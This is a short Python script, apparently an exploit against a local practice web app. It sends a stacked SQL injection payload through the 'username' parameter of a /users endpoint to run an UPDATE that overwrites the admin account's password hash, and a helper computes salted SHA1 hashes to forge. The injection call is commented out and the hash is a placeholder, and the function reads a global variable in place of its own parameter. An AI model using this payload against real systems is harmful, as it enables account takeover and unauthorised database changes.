import requests
import hashlib


BASE_URL = "http://localhost:8080/users"

def change_password(user, password_hash):
    payload = f"{user}'; UPDATE users SET password='{hash}' WHERE user_name='{user}';-- "

    print("[+] Sending stacked SQL injection payload...")
    resp = requests.get(BASE_URL, params={"username": payload})

    print("Status:", resp.status_code)
    print("Response:", resp.text)

def sha1_hash(salt, password):
    h = hashlib.sha1()
    h.update((salt + password).encode())

    print(h.hexdigest())


if __name__ == '__main__':
    user = "admin"  # your account
    hash = "5baa"  # replace with real extracted hash

    #change_password(user, hash)
    sha1_hash("ThisIsSalt", "gela")